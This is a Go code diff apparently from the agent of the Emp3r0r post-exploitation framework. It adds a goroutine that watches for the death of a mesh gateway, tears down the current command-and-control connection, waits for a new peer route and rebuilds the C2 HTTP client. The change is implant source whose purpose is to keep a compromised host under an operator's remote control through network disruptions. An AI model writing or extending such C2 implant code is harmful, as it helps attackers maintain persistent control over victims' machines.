@@ -160,6 +160,35 @@ func agent_main() {
 				logging.Fatalf("Failed to create mesh C2 client")
 			}
 			logging.Printf("[+] Mesh route ready via gateway %s", mesh.GetGatewayIP())
+
+			// Monitor gateway liveness. When the gateway dies, the
+			// mesh.watchPeers loop closes mesh.GatewayDeadCh. We react by
+			// killing the current C2 connection (so MsgTunneler returns) and
+			// rebuilding the HTTP client once a new gateway is available.
+			go func() {
+				for {
+					select {
+					case <-meshCtx.Done():
+						return
+					case <-mesh.GatewayDeadCh:
+						logging.Warningf("Mesh: gateway died, tearing down C2 connection and waiting for new route...")
+						// Drop the stale HTTP client so the next dial will use
+						// the new gateway chosen by watchPeers.
+						def.HTTPClient = nil
+						// Cancel any active C2 connection to unblock MsgTunneler.
+						if def.CCMsgConn != nil {
+							def.CCMsgConn.Close()
+						}
+						// Wait until watchPeers finds a live gateway.
+						newGW := mesh.WaitForRoute()
+						logging.Infof("Mesh: new gateway ready: %s, rebuilding C2 client", newGW)
+						def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
+						if def.HTTPClient == nil {
+							logging.Errorf("Mesh: failed to rebuild C2 client via new gateway")
+						}
+					}
+				}
+			}()
 		} else {
 			// Gateway: also serves the relay, but contacts C2 normally.
 			logging.Println("[*] Mesh Gateway mode: relay started, connecting to C2 directly")
